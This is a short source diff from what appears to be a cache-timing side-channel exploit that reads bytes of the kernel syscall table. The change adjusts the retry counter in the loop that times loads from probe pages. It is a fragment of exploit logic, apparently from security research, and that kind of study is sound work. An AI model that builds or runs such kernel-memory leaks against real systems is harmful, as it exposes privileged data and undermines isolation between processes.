@@ -133,11 +133,18 @@ static uint8_t probe_one_syscall_table_address_byte(uintptr_t target_address, ch
         }
 
         static_assert(total_pages <= std::numeric_limits<uint8_t>::max()+1, "total_pages will overflow index");
+        bool incr = false;
         for (auto i = 0; i < total_pages; i++) {
             durations[i] = __measure_load_execution(&pages[i * page_size()]);
 
             if (durations[i] <= g_cache_hit_threshold) {
-                r++;
+                // we don't increment r twice in the same iteration or result could be compromised due
+                // to lack of actual retries, but we still want to account for all durations which met
+                // the threshold for when inferring the byte read from kernel address.
+                if (!incr) {
+                    r++;
+                    incr = true;
+                }
                 index_heat[i]++;
             }
         }
